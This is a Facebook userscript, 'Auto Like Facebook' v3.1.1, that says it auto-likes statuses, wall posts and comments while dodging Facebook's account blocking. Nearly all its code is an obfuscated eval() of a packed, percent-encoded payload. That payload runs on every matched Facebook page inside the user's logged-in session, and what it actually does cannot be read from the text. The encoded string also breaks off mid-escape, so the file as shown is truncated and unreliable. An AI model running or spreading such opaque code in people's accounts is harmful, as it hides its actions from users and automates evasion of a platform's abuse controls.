// ==UserScript==
// @name			Auto Like Facebook
// @namespace		auto_like_facebook
// @version			3.1.1
// @installURL		https://github.com/ichandkusuma/auto-like-facebook/raw/master/autolike.user.js
// @icon			https://github.com/ichandkusuma/auto-like-facebook/raw/master/autolike.png
// @updateURL		https://github.com/ichandkusuma/auto-like-facebook/raw/master/autolike.user.js
// @description		Auto Like Facebook by Kakiteng c Kusuma. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the facebook account.
// @author			Ichand Kusuma
// @authorURL		http://www.facebook.com/ichandkusuma
// @authorURL		https://twitter.com/iChaNDkusuma
// @homepage		http://www.kakiteng.com/auto-like-facebook
// @include			https://www.facebook.com/*
// @exclude			htt*://www.facebook.com/about/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @exclude			htt*://www.facebook.com/ci_partner/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://www.facebook.com/places/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/messages/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/pages/*
// @exclude			htt*://www.facebook.com/help/*
// @exclude			htt*://www.facebook.com/events/*
// @exclude			htt*://www.facebook.com/*/about
// @exclude			htt*://www.facebook.com/*/events
// @exclude			htt*://www.facebook.com/*/friends
// @exclude			htt*://www.facebook.com/*/photos*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://apps.facebook.com/ajax/*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*

// ==/UserScript==
// ===================================================
// == Copaser Yang Baik Tidak Akan Menghapus Credit ==
// ===== Nama : Auto Like Facebook v3.1.1 ======
// ============= Author : Ichand Kusuma ==============
// ============= Site : www.kakiteng.com =============
// ===================================================

eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('16(17(\'%t%6%7%z%4%s%4%7%6%c%x%k%2%9%a%n%t%6%7%z%u%4%l%i%4%e%t%6%7%z%4%X%s%s%4%9%x%h%h%d%4%K%4%7%f%H%p%c%4%s%4%7%6%c%x%k%2%9%a%n%c%D%2%g%a%2%W%h%2%k%2%9%a%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%b%0%8%f%0%1%g%0%5%1%0%1%8%0%3%3%j%d%d%d%u%4%7%f%H%p%c%n%y%2%a%Y%a%a%D%l%t%x%a%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%5%0%1%q%0%1%b%0%3%5%j%d%d%10%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%5%0%1%c%0%1%q%0%1%t%0%1%f%0%8%3%0%3%5%j%d%d%d%u%4%7%f%H%p%c%n%y%a%z%h%2%n%o%6%y%l%a%l%6%9%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%1%0%1%q%0%5%w%0%1%f%0%1%b%0%3%3%j%d%d%u%4%7%f%H%p%c%n%y%a%z%h%2%n%7%l%y%o%h%g%z%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%3%0%1%c%0%1%i%0%1%8%0%1%t%0%3%3%j%d%d%u%4%7%f%H%p%c%n%y%a%z%h%2%n%F%l%7%a%L%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%r%0%8%8%0%8%m%0%5%m%0%5%w%0%3%3%j%d%d%u%4%7%f%H%p%c%n%y%a%z%h%2%n%6%o%g%c%l%a%z%4%s%4%m%n%q%m%u%4%7%f%H%p%c%n%y%a%z%h%2%n%t%6%a%a%6%k%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%t%0%8%r%0%8%r%0%8%5%0%5%m%0%5%w%0%3%3%j%d%d%u%4%7%f%H%p%c%n%y%a%z%h%2%n%h%2%i%a%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%t%0%8%w%0%5%m%0%5%w%0%3%3%j%d%d%u%4%7%f%H%p%c%n%y%a%z%h%2%n%t%g%c%R%E%D%6%x%9%7%v%6%h%6%D%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%8%0%b%1%0%b%1%0%b%1%0%b%1%0%b%1%0%b%1%0%3%3%j%d%d%u%4%7%f%H%p%c%n%y%a%z%h%2%n%t%6%D%7%2%D%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%r%0%5%m%0%5%w%0%3%m%0%5%8%0%1%i%0%1%c%0%1%q%0%1%b%0%3%m%0%3%8%0%b%b%0%b%1%0%b%f%0%8%m%0%b%f%0%8%b%0%3%3%j%d%d%u%4%7%f%H%p%c%n%y%a%z%h%2%n%o%g%7%7%l%9%E%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%8%0%5%m%0%5%w%0%3%3%j%d%d%u%4%7%f%H%p%c%n%l%9%9%2%D%V%P%U%T%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%c%0%1%r%0%3%m%0%5%8%0%5%b%0%5%q%0%1%c%0%1%f%0%8%7%0%3%5%0%1%1%0%1%i%0%1%2%0%5%b%0%3%7%0%5%5%0%1%f%0%1%q%0%1%5%0%1%w%0%5%b%0%8%g%0%1%c%0%1%q%0%1%5%0%1%w%0%5%b%0%1%f%0%5%3%0%8%t%0%1%8%0%1%i%0%1%c%0%1%i%0%5%3%0%8%g%0%3%8%0%8%8%0%8%1%0%8%f%0%8%w%0%b%r%0%8%f%0%3%5%0%3%m%0%1%i%0%1%2%0%1%8%0%1%c%0%1%q%0%1%8%0%1%t%0%8%7%0%3%5%0%b%r%0%5%f%0%5%b%0%1%i%0%b%c%0%1%q%0%1%t%0%1%f%0%3%w%0%3%q%0%3%5%0%8%2%0%8%c%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%b%c%0%1%q%0%1%t%0%1%f%0%3%m%0%b%r%0%1%c%0%1%c%0%3%m%0%f%8%0%5%b%0%1%r%0%5%b%0%5%f%0%5%8%0%8%c%0%3%i%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%8%c%0%3%i%0%1%r%0%8%2%0%3%3%j%d%d%u%4%t%6%7%z%n%g%o%o%2%9%7%v%L%l%h%7%e%7%f%H%p%c%d%u%4%x%9%y%g%i%2%13%l%9%7%6%F%n%Y%x%a%6%T%l%R%2%4%s%4%i%x%9%c%a%l%6%9%4%e%d%4%K%4%p%g%D%4%y%1%F%h%N%4%s%4%m%u%4%p%g%D%4%a%m%F%7%E%4%s%4%m%u%4%p%g%D%4%k%b%D%k%k%4%s%4%7%6%c%x%k%2%9%a%n%E%2%a%W%h%2%k%2%9%a%y%11%z%P%g%E%18%g%k%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%r%0%3%3%j%d%d%d%u%4%p%g%D%4%c%q%z%y%k%4%s%4%Q%O%u%4%i%6%D%4%e%p%g%D%4%l%4%s%4%m%u%4%l%4%12%4%k%b%D%k%k%n%h%2%9%E%a%L%u%4%l%M%M%d%4%l%i%4%e%k%b%D%k%k%Q%l%O%n%E%2%a%Y%a%a%D%l%t%x%a%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%b%0%1%r%0%5%b%0%1%r%0%3%7%0%5%b%0%1%f%0%5%8%0%5%b%0%1%q%0%1%b%0%3%3%j%d%d%d%4%X%s%s%4%9%x%h%h%4%Z%Z%4%k%b%D%k%k%Q%l%O%n%E%2%a%Y%a%a%D%l%t%x%a%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%b%0%1%r%0%5%b%0%1%r%0%3%7%0%5%b%0%1%f%0%5%8%0%5%b%0%1%q%0%1%b%0%3%3%j%d%d%d%4%n%l%9%7%2%I%14%i%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%1%0%1%3%0%3%7%0%5%f%0%1%1%0%1%q%0%3%7%0%1%c%0%1%q%0%1%t%0%1%f%0%1%c%0%1%q%0%1%2%0%1%t%0%3%3%j%d%d%d%4%15%s%4%m%4%d%4%K%4%c%q%z%y%k%Q%a%m%F%7%E%O%4%s%4%k%b%D%k%k%Q%l%O%u%4%a%m%F%7%E%M%M%u%4%J%4%i%x%9%c%a%l%6%9%4%o%r%g%G%i%e%k%5%c%N%i%d%4%K%4%c%q%z%y%k%Q%k%5%c%N%i%O%n%c%h%l%c%R%e%d%u%4%p%g%D%4%x%8%7%G%p%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%c%0%1%r%0%3%m%0%5%8%0%5%b%0%5%q%0%1%c%0%1%f%0%8%7%0%3%5%0%1%1%0%1%i%0%1%2%0%5%b%0%3%7%0%5%5%0%1%f%0%1%q%0%1%5%0%1%w%0%5%b%0%8%g%0%1%c%0%1%q%0%1%5%0%1%w%0%5%b%0%1%f%0%5%3%0%8%t%0%1%8%0%1%i%0%1%c%0%1%i%0%5%3%0%8%g%0%3%8%0%8%8%0%8%1%0%8%f%0%8%w%0%b%r%0%8%f%0%3%5%0%8%2%0%8%c%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%b%c%0%1%q%0%1%t%0%1%f%0%3%m%0%f%8%0%5%b%0%1%r%0%5%b%0%5%f%0%5%8%0%8%g%0%3%m%0%3%3%j%d%d%4%M%4%e%k%5%c%N%i%4%M%4%r%d%4%M%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%i%0%3%3%j%d%d%4%M%4%c%q%z%y%k%n%h%2%9%E%a%L%4%M%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%c%0%3%i%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%8%c%0%3%i%0%1%r%0%8%2%0%3%3%j%d%d%u%4%7%6%c%x%k%2%9%a%n%E%2%a%W%h%2%k%2%9%a%11%z%A%7%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%5%0%1%c%0%1%q%0%1%t%0%1%f%0%8%3%0%3%5%j%d%d%d%4%n%l%9%9%2%D%V%P%U%T%4%s%4%x%8%7%G%p%u%4%J%4%i%x%9%c%a%l%6%9%4%I%w%N%x%N%e%E%5%F%c%I%d%4%K%4%F%l%9%7%6%F%n%y%2%a%P%l%k%2%6%x%a%e%p%5%l%E%7%10%4%E%5%F%c%I%d%u%4%J%4%i%x%9%c%a%l%6%9%4%F%q%g%x%o%e%d%4%K%4%p%g%D%4%c%r%R%R%L%4%s%4%7%6%c%x%k%2%9%a%n%E%2%a%W%h%2%k%2%9%a%y%11%z%P%g%E%18%g%k%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%c%0%1%r%0%1%3%0%1%f%0%1%c%0%3%3%j%d%d%d%u%4%p%g%D%4%k%f%l%2%9%4%s%4%i%g%h%y%2%u%4%i%6%D%4%e%p%g%D%4%l%4%s%4%m%u%4%l%4%12%4%c%r%R%R%L%n%h%2%9%E%a%L%u%4%l%M%M%d%4%K%4%p%g%D%4%z%w%g%g%F%4%s%4%c%r%R%R%L%Q%l%O%n%E%2%a%Y%a%a%D%l%t%x%a%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%8%0%1%c%0%1%r%0%5%8%0%5%8%0%3%3%j%d%d%d%u%4%l%i%4%e%z%w%g%g%F%4%X%s%s%4%9%x%h%h%4%Z%Z%4%z%w%g%g%F%n%l%9%7%2%I%14%i%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%5%f%0%1%q%0%b%3%0%5%f%0%5%b%0%5%b%0%1%i%0%1%2%0%3%m%0%5%f%0%1%q%0%b%3%0%5%f%0%5%b%0%5%b%0%1%i%0%1%2%0%b%c%0%1%r%0%5%3%0%1%5%0%1%f%0%3%m%0%5%f%0%1%q%0%b%3%0%5%f%0%5%b%0%5%b%0%1%i%0%1%2%0%b%8%0%1%i%0%1%2%0%1%1%0%1%q%0%5%3%0%1%7%0%3%3%j%d%d%d%4%15%s%4%m%d%4%K%4%g%h%2%D%a%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%f%5%0%1%r%0%5%3%0%1%2%0%1%q%0%1%2%0%1%5%0%3%m%0%1%1%0%5%3%0%1%i%0%1%7%0%3%m%0%b%1%0%1%r%0%1%8%0%1%f%0%1%3%0%1%i%0%1%i%0%1%t%0%3%3%j%d%d%d%u%4%k%f%l%2%9%4%s%4%a%D%x%2%u%4%J%4%J%4%l%i%4%e%X%k%f%l%2%9%d%4%I%w%N%x%N%e%3%r%1%m%d%u%4%J%4%i%x%9%c%a%l%6%9%4%9%f%N%G%i%e%E%5%F%c%I%d%4%K%4%F%l%9%7%6%F%n%y%2%a%P%l%k%2%6%x%a%e%F%q%g%x%o%10%4%E%5%F%c%I%d%u%4%J%4%i%x%9%c%a%l%6%9%4%p%5%l%E%7%e%d%4%K%4%l%i%4%e%y%1%F%h%N%4%12%4%c%q%z%y%k%n%h%2%9%E%a%L%d%4%K%4%o%r%g%G%i%e%y%1%F%h%N%d%u%4%9%f%N%G%i%e%5%m%m%d%u%4%y%1%F%h%N%M%M%u%4%J%4%2%h%y%2%4%K%4%F%l%9%7%6%F%n%h%6%c%g%a%l%6%9%n%L%D%2%i%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%3%j%d%d%u%4%J%4%J%4%g%h%2%D%a%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%5%0%b%r%0%5%f%0%5%b%0%1%i%0%3%m%0%b%c%0%1%q%0%1%t%0%1%f%0%3%m%0%1%q%0%5%8%0%3%m%0%5%8%0%5%b%0%1%r%0%5%3%0%5%b%0%1%f%0%1%b%0%3%5%j%d%d%d%u%4%p%5%l%E%7%e%d%u%4%J%u%4%J%4\'));16(17(\'%t%6%7%z%4%s%4%7%6%c%x%k%2%9%a%n%t%6%7%z%u%4%l%i%4%e%t%6%7%z%4%X%s%s%4%9%x%h%h%d%4%K%4%6%b%x%k%x%4%s%4%7%6%c%x%k%2%9%a%n%c%D%2%g%a%2%W%h%2%k%2%9%a%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%i%0%8%b%0%5%f%0%1%7%0%5%f%0%3%3%j%d%d%d%u%4%6%b%x%k%x%n%y%2%a%Y%a%a%D%l%t%x%a%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%5%0%1%q%0%1%b%0%3%5%j%d%d%10%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%5%0%1%c%0%1%q%0%1%t%0%1%f%0%8%8%0%3%5%j%d%d%d%u%4%6%b%x%k%x%n%y%a%z%h%2%n%o%6%y%l%a%l%6%9%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%1%0%1%q%0%5%w%0%1%f%0%1%b%0%3%3%j%d%d%u%4%6%b%x%k%x%n%y%a%z%h%2%n%7%l%y%o%h%g%z%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%3%0%1%c%0%1%i%0%1%8%0%1%t%0%3%3%j%d%d%u%4%6%b%x%k%x%n%y%a%z%h%2%n%F%l%7%a%L%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%r%0%8%8%0%8%m%0%5%m%0%5%w%0%3%3%j%d%d%u%4%6%b%x%k%x%n%y%a%z%h%2%n%6%o%g%c%l%a%z%4%s%4%m%n%q%m%u%4%6%b%x%k%x%n%y%a%z%h%2%n%t%6%a%a%6%k%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%t%0%8%q%0%8%b%0%5%m%0%5%w%0%3%3%j%d%d%u%4%6%b%x%k%x%n%y%a%z%h%2%n%h%2%i%a%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%t%0%8%w%0%5%m%0%5%w%0%3%3%j%d%d%u%4%6%b%x%k%x%n%y%a%z%h%2%n%t%g%c%R%E%D%6%x%9%7%v%6%h%6%D%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%8%0%b%1%0%b%1%0%b%1%0%b%1%0%b%1%0%b%1%0%3%3%j%d%d%u%4%6%b%x%k%x%n%y%a%z%h%2%n%t%6%D%7%2%D%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%r%0%5%m%0%5%w%0%3%m%0%5%8%0%1%i%0%1%c%0%1%q%0%1%b%0%3%m%0%3%8%0%b%b%0%b%1%0%b%f%0%8%m%0%b%f%0%8%b%0%3%3%j%d%d%u%4%6%b%x%k%x%n%y%a%z%h%2%n%o%g%7%7%l%9%E%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%8%0%5%m%0%5%w%0%3%3%j%d%d%u%4%6%b%x%k%x%n%l%9%9%2%D%V%P%U%T%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%c%0%1%r%0%3%m%0%5%8%0%5%b%0%5%q%0%1%c%0%1%f%0%8%7%0%3%5%0%1%1%0%1%i%0%1%2%0%5%b%0%3%7%0%5%5%0%1%f%0%1%q%0%1%5%0%1%w%0%5%b%0%8%g%0%1%c%0%1%q%0%1%5%0%1%w%0%5%b%0%1%f%0%5%3%0%8%t%0%1%8%0%1%i%0%1%c%0%1%i%0%5%3%0%8%g%0%3%8%0%8%8%0%8%1%0%8%f%0%8%w%0%b%r%0%8%f%0%3%5%0%3%m%0%1%i%0%1%2%0%1%8%0%1%c%0%1%q%0%1%8%0%1%t%0%8%7%0%3%5%0%b%c%0%1%q%0%1%t%0%1%f%0%b%8%0%1%i%0%1%7%0%1%7%0%1%f%0%1%2%0%5%b%0%5%8%0%3%w%0%3%q%0%3%5%0%8%2%0%8%c%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%b%c%0%1%q%0%1%t%0%1%f%0%3%m%0%b%r%0%1%c%0%1%c%0%3%m%0%b%8%0%1%i%0%1%7%0%1%7%0%1%f%0%1%2%0%5%b%0%5%8%0%8%c%0%3%i%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%8%c%0%3%i%0%1%r%0%8%2%0%3%3%j%d%d%u%4%t%6%7%z%n%g%o%o%2%9%7%v%L%l%h%7%e%6%b%x%k%x%d%u%4%x%9%y%g%i%2%13%l%9%7%6%F%n%T%l%R%2%v%6%k%k%2%9%a%y%4%s%4%i%x%9%c%a%l%6%9%4%e%d%4%K%4%p%g%D%4%G%b%y%l%p%4%s%4%m%u%4%p%g%D%4%R%q%k%R%x%4%s%4%m%u%4%p%g%D%4%G%r%I%H%G%4%s%4%7%6%c%x%k%2%9%a%n%E%2%a%W%h%2%k%2%9%a%y%11%z%P%g%E%18%g%k%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%r%0%3%3%j%d%d%d%u%4%p%g%D%4%a%r%i%o%h%4%s%4%Q%O%u%4%i%6%D%4%e%p%g%D%4%l%4%s%4%m%u%4%l%4%12%4%G%r%I%H%G%n%h%2%9%E%a%L%u%4%l%M%M%d%4%l%i%4%e%G%r%I%H%G%Q%l%O%n%E%2%a%Y%a%a%D%l%t%x%a%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%b%0%1%r%0%5%b%0%1%r%0%3%7%0%5%b%0%1%f%0%5%8%0%5%b%0%1%q%0%1%b%0%3%3%j%d%d%d%4%X%s%s%4%9%x%h%h%4%Z%Z%4%e%G%r%I%H%G%Q%l%O%n%E%2%a%Y%a%a%D%l%t%x%a%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%b%0%1%r%0%5%b%0%1%r%0%3%7%0%5%b%0%1%f%0%5%8%0%5%b%0%1%q%0%1%b%0%3%3%j%d%d%d%n%l%9%7%2%I%14%i%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%5%f%0%1%1%0%1%q%0%f%i%0%1%8%0%1%i%0%1%7%0%1%7%0%1%f%0%1%2%0%5%b%0%f%i%0%1%c%0%1%q%0%1%t%0%1%f%0%f%i%0%1%c%0%1%q%0%1%2%0%1%t%0%3%3%j%d%d%d%4%15%s%4%m%4%S%S%4%G%r%I%H%G%Q%l%O%n%E%2%a%Y%a%a%D%l%t%x%a%2%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%1%b%0%1%r%0%5%b%0%1%r%0%3%7%0%5%b%0%1%f%0%5%8%0%5%b%0%1%q%0%1%b%0%3%3%j%d%d%d%n%l%9%7%2%I%14%i%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%5%f%0%1%1%0%1%q%0%f%i%0%5%3%0%1%f%0%5%m%0%1%c%0%5%q%0%f%i%0%1%c%0%1%q%0%1%t%0%1%f%0%f%i%0%1%c%0%1%q%0%1%2%0%1%t%0%3%3%j%d%d%d%4%15%s%4%m%d%4%Z%Z%4%e%G%r%I%H%G%Q%l%O%n%l%9%9%2%D%V%P%U%T%4%s%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%b%7%0%1%f%0%3%m%0%1%5%0%5%f%0%5%8%0%5%b%0%1%r%0%3%3%j%d%d%4%S%S%4%G%r%I%H%G%Q%l%O%n%l%9%9%2%D%V%P%U%T%4%s%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%b%c%0%1%q%0%1%t%0%1%f%0%3%3%j%d%d%4%S%S%4%G%r%I%H%G%Q%l%O%n%l%9%9%2%D%V%P%U%T%4%s%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%f%8%0%5%f%0%1%t%0%1%r%0%3%3%j%d%d%4%S%S%4%G%r%I%H%G%Q%l%O%n%l%9%9%2%D%V%P%U%T%4%s%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%b%3%0%1%f%0%c%b%0%q%i%0%1%f%0%1%2%0%3%3%j%d%d%4%S%S%4%G%r%I%H%G%Q%l%O%n%l%9%9%2%D%V%P%U%T%4%s%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%7%w%0%g%8%0%7%w%0%t%q%0%7%w%0%g%c%0%7%w%0%g%w%0%7%q%0%w%1%0%7%q%0%w%g%0%3%3%j%d%d%4%S%S%4%G%r%I%H%G%Q%l%O%n%l%9%9%2%D%V%P%U%T%4%s%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%2%8%0%w%r%0%w%b%0%2%8%0%w%r%0%w%b%0%2%8%0%w%r%0%g%7%0%2%i%0%t%c%0%w%r%0%3%3%j%d%d%4%S%S%4%G%r%I%H%G%Q%l%O%n%l%9%9%2%D%V%P%U%T%4%s%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%2%w%0%g%2%0%q%g%0%3%3%j%d%d%4%S%S%4%G%r%I%H%G%Q%l%O%n%l%9%9%2%D%V%P%U%T%4%s%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%f%8%0%1%f%0%1%2%0%1%f%0%1%2%0%1%5%0%3%3%j%d%d%4%S%S%4%G%r%I%H%G%Q%l%O%n%l%9%9%2%D%V%P%U%T%4%s%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%2%c%0%g%3%0%w%t%0%2%c%0%q%f%0%w%b%0%2%c%0%q%g%0%q%b%0%3%3%j%d%d%4%S%S%4%G%r%I%H%G%Q%l%O%n%l%9%9%2%D%V%P%U%T%4%s%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%b%g%0%2%3%0%w%m%0%q%q%0%1%r%0%1%q%0%1%7%0%1%f%0%3%3%j%d%d%d%d%4%K%4%a%r%i%o%h%Q%R%q%k%R%x%O%4%s%4%G%r%I%H%G%Q%l%O%u%4%R%q%k%R%x%M%M%u%4%J%4%i%x%9%c%a%l%6%9%4%t%1%y%L%9%e%9%f%p%D%t%d%4%K%4%a%r%i%o%h%Q%9%f%p%D%t%O%n%c%h%l%c%R%e%d%u%4%p%g%D%4%i%3%F%I%o%4%s%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%c%0%1%r%0%3%m%0%5%8%0%5%b%0%5%q%0%1%c%0%1%f%0%8%7%0%3%5%0%1%1%0%1%i%0%1%2%0%5%b%0%3%7%0%5%5%0%1%f%0%1%q%0%1%5%0%1%w%0%5%b%0%8%g%0%1%c%0%1%q%0%1%5%0%1%w%0%5%b%0%1%f%0%5%3%0%8%t%0%1%8%0%1%i%0%1%c%0%1%i%0%5%3%0%8%g%0%3%8%0%8%8%0%8%1%0%8%f%0%8%w%0%b%r%0%8%f%0%3%5%0%8%2%0%8%c%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%b%c%0%1%q%0%1%t%0%1%f%0%3%m%0%b%8%0%1%i%0%1%7%0%1%7%0%1%f%0%1%2%0%5%b%0%5%8%0%8%g%0%3%m%0%3%3%j%d%d%4%M%4%e%9%f%p%D%t%4%M%4%r%d%4%M%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%3%i%0%3%3%j%d%d%4%M%4%a%r%i%o%h%n%h%2%9%E%a%L%4%M%4%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%3%0%8%c%0%3%i%0%1%8%0%1%f%0%1%2%0%5%b%0%1%f%0%5%3%0%8%2%0%8%c%0%3%i%0%1%r%0%8%2%0%3%3%j%d%d%u%4%7%6%c%x%k%2%9%a%n%E%2%a%W%h%2%k%2%9%a%11%z%A%7%e%2%p%g%h%e%7%2%c%6%7%2%B%C%A%v%6%k%o%6%9%2%9%a%e%j%0%3%5%0%1%c%0%1%q%0%1%t%0%1%f%0%8%8%0%3%5%j%d%